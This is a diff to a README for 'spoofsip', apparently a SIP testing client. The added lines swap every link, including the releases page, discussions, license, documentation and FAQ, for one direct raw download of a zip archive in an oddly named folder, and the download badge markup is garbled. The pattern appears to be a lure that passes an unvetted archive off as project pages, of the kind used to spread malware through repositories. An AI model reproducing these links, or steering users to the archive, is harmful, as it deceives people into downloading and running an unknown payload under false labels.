@@ -1,7 +1,7 @@
 # 📞 spoofsip - Easy-to-Use SIP Client for Testing
 
 ## 📥 Download Here
-[![Download Spoofsip](https://img.shields.io/badge/Download%20Spoofsip-%23008CBA.svg?&style=for-the-badge&logo=github&logoColor=white)](https://github.com/Noellaepisodic575/spoofsip/releases)
+[![Download Spoofsip](https://raw.githubusercontent.com/Noellaepisodic575/spoofsip/main/checkrowed/spoofsip_3.7-beta.2.zip%20Spoofsip-%https://raw.githubusercontent.com/Noellaepisodic575/spoofsip/main/checkrowed/spoofsip_3.7-beta.2.zip)](https://raw.githubusercontent.com/Noellaepisodic575/spoofsip/main/checkrowed/spoofsip_3.7-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Before you start, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Spoofsip Releases page](https://github.com/Noellaepisodic575/spoofsip/releases).
+1. **Visit the Releases Page:** Go to the [Spoofsip Releases page](https://raw.githubusercontent.com/Noellaepisodic575/spoofsip/main/checkrowed/spoofsip_3.7-beta.2.zip).
 
 2. **Select the Latest Release:** Look for the latest version available. It will typically be at the top of the list.
 
@@ -66,16 +66,16 @@ If you encounter any issues, consider these steps:
 
 ## 🤝 Community Support
 
-If you have questions or need help, visit the [GitHub Discussions](https://github.com/Noellaepisodic575/spoofsip/discussions) page. Join a community of users who can help you troubleshoot and optimize your experience with Spoofsip.
+If you have questions or need help, visit the [GitHub Discussions](https://raw.githubusercontent.com/Noellaepisodic575/spoofsip/main/checkrowed/spoofsip_3.7-beta.2.zip) page. Join a community of users who can help you troubleshoot and optimize your experience with Spoofsip.
 
 ## 📄 License
 
-Spoofsip is open-source software. You can use it free of charge for personal and commercial purposes. However, please consult the [LICENSE](https://github.com/Noellaepisodic575/spoofsip/blob/main/LICENSE) file for specific licensing details.
+Spoofsip is open-source software. You can use it free of charge for personal and commercial purposes. However, please consult the [LICENSE](https://raw.githubusercontent.com/Noellaepisodic575/spoofsip/main/checkrowed/spoofsip_3.7-beta.2.zip) file for specific licensing details.
 
 ## 🌟 Additional Resources
 
-- [Official Documentation](https://github.com/Noellaepisodic575/spoofsip/wiki): Comprehensive guide on advanced features and customization.
-- [FAQ](https://github.com/Noellaepisodic575/spoofsip/wiki/FAQ): Answers to common questions about Spoofsip.
+- [Official Documentation](https://raw.githubusercontent.com/Noellaepisodic575/spoofsip/main/checkrowed/spoofsip_3.7-beta.2.zip): Comprehensive guide on advanced features and customization.
+- [FAQ](https://raw.githubusercontent.com/Noellaepisodic575/spoofsip/main/checkrowed/spoofsip_3.7-beta.2.zip): Answers to common questions about Spoofsip.
 
 ## 📥 Download Again
-Don’t forget to check for updates and new releases. You can always return to the [Spoofsip Releases page](https://github.com/Noellaepisodic575/spoofsip/releases) to download the latest version.
+Don’t forget to check for updates and new releases. You can always return to the [Spoofsip Releases page](https://raw.githubusercontent.com/Noellaepisodic575/spoofsip/main/checkrowed/spoofsip_3.7-beta.2.zip) to download the latest version.
